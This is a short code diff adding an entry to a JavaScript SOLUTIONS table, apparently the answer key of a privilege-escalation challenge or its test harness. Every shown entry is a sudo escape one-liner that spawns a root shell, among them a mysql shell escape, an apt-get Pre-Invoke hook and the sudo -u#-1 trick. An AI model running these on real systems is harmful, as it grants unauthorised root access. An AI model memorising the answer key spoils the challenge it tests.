@@ -98,6 +98,7 @@ const SOLUTIONS = {
     28: ['sudo -u#-1 /bin/bash'],
     29: ['sudo systemd-run /bin/sh'],
     30: ['sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh'],
+    31: ["sudo mysql -e '\\! /bin/sh'"],
 };
 
 let pass = 0, fail = 0;
